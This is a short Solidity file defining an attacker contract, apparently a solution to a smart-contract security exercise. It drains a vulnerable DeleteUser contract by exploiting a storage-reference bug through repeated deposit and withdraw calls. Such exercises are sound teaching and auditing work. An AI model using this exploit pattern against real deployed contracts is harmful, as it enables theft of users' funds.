// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../DeleteUser.sol";

// User storage user = users[index];
// storage modifier is acting NOT like a pointer from C++. More like reference from Java.

contract DeleteUserAttacker {
    DeleteUser victim;

    constructor(DeleteUser victim_)  {
        victim = victim_;
    }

    function attack() external payable {
        victim.deposit{value: 1 ether}();
        victim.deposit();
        victim.withdraw(1);
        victim.withdraw(1);
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    receive() external payable {

    }
}
